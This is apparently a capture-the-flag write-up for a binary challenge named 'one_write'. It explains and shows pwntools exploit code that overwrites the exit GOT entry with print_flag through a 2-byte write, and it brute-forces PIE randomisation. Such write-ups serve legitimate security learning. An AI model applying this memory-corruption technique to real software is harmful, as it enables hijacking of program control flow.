# one_write
The goal is to read the flag.

## Context
- The binary allows the user to write either a byte, short, or integer to a specified memory location.

## Approach
By disassembling the executable, I identified the `print_flag` function. The strategy is to overwrite the `exit` function's GOT entry with the address of `print_flag`, so that when the program tries to call exit, it will instead execute print_flag and print the flag.
```{python}
magic = CHALL.symbols['magic']
tgt_address = CHALL.got['exit']
off = tgt_address - magic 
print_flag_addr = CHALL.symbols['print_flag']

c.recvuntil(b'Choice: ')
c.sendline(b'2')
c.recvuntil(b'Offset: ')
c.sendline(bytes(str(off), 'utf-8'))
c.recvuntil(b'Value: ')
c.sendline(b'809') 
c.recvuntil('you.\n')
print(c.recvline())
c.interactive()
```

- I choose option 2 to perform a short write (only 2 bytes).
- `magic` is where the write is performed. So I calculated the offset from `magic` to the `exit`.
- Then I send the value of the last 2 bytes of `print_flag`.
- Since the binary is compiled with Position Independent Executable (PIE), the base address is randomized on each execution. To bypass this, the solution requires bruteforcing the address bits for the dynamic page when interacting with the remote challenge. I used a loop to bruteforce the randomized address bits for the dynamic page and successfully execute the exploit.
